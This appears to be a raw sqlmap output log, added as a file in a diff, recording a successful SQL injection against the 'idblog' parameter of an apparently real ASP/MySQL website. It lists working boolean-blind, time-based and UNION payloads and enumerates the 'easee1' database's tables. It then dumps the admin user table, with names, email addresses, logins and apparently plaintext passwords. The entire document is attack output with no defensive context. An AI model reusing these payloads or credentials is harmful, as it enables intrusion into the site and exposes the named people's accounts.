@@ -1,0 +1,163 @@
+sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
+---
+Parameter: idblog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idblog=48 AND 9137=9137
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idblog=48 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: idblog=-4084 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6a736955624879484c6e4779686d4c7562644e744b6763486b4e55786d584965696a764953517579,0x71707a7171),NULL,NULL-- Kspr
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5, ASP
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] easee1
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idblog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idblog=48 AND 9137=9137
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idblog=48 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: idblog=-4084 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6a736955624879484c6e4779686d4c7562644e744b6763486b4e55786d584965696a764953517579,0x71707a7171),NULL,NULL-- Kspr
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5, ASP
+back-end DBMS: MySQL >= 5.0.12
+Database: easee1
+[29 tables]
++---------------------+
+| banners1            |
+| blog1               |
+| blogcategorias1     |
+| blogfotos1          |
+| clientes1           |
+| config1             |
+| contatomensagem1    |
+| contatos1           |
+| contatosdestinos1   |
+| conteudo_auxcat     |
+| conteudo_auxches    |
+| conteudo_auxsel     |
+| conteudo_cat        |
+| conteudo_txt_modelo |
+| destaqueeasee1      |
+| easee1              |
+| equipe1             |
+| especialidades1     |
+| mailing1            |
+| menuconteudo        |
+| portfolio1          |
+| portfoliofoto1      |
+| redessociais1       |
+| redessociaisequipe1 |
+| servicos1           |
+| wausuarios          |
+| wausuarios_hist     |
+| wausuarios_perm     |
+| webapps             |
++---------------------+
+
+Database: easee1
++---------------------+---------+
+| Table               | Entries |
++---------------------+---------+
+| contatos1           | 377     |
+| wausuarios_hist     | 151     |
+| portfoliofoto1      | 59      |
+| portfolio1          | 27      |
+| conteudo_auxsel     | 22      |
+| conteudo_cat        | 21      |
+| blog1               | 20      |
+| blogfotos1          | 8       |
+| servicos1           | 7       |
+| banners1            | 3       |
+| webapps             | 3       |
+| blogcategorias1     | 2       |
+| redessociais1       | 2       |
+| wausuarios          | 2       |
+| wausuarios_perm     | 2       |
+| config1             | 1       |
+| contatomensagem1    | 1       |
+| contatosdestinos1   | 1       |
+| conteudo_auxches    | 1       |
+| easee1              | 1       |
+| equipe1             | 1       |
+| especialidades1     | 1       |
+| mailing1            | 1       |
+| menuconteudo        | 1       |
+| redessociaisequipe1 | 1       |
++---------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idblog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idblog=48 AND 9137=9137
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idblog=48 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: idblog=-4084 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6a736955624879484c6e4779686d4c7562644e744b6763486b4e55786d584965696a764953517579,0x71707a7171),NULL,NULL-- Kspr
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5, ASP
+back-end DBMS: MySQL >= 5.0.12
+Database: easee1
+Table: wausuarios
+[2 entries]
++----+-------------------+----------------------+----------+---------+-------+---------+-------------------+
+| id | nome              | email                | senha    | login   | ativo | acessos | criadoPor         |
++----+-------------------+----------------------+----------+---------+-------+---------+-------------------+
+| 1  | Administrador     | contato@dominio.com  | 2014     | wa      | s     | 151     | Agência d.Tavares |
+| 2  | Agência d.Tavares | agencia@dtavares.com | dTavares | agencia | s     | 0       | Agência d.Tavares |
++----+-------------------+----------------------+----------+---------+-------+---------+-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idblog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idblog=48 AND 9137=9137
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idblog=48 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: idblog=-4084 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6a736955624879484c6e4779686d4c7562644e744b6763486b4e55786d584965696a764953517579,0x71707a7171),NULL,NULL-- Kspr
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5, ASP
+back-end DBMS: MySQL >= 5.0.12
